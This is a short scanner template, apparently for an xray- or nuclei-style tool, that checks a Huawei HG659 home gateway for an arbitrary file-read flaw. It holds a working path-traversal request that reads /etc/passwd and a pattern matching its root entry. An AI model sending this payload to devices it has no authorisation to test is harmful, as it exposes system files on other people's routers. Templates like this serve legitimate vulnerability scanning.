id: huawei-home-gateway-hg659-fileread

info:
    name: huawei-home-gateway-hg659-fileread
    author: B1anda0(https://github.com/B1anda0)
    severity: high

manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /lib///....//....//....//....//....//....//....//....//etc//passwd
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0()

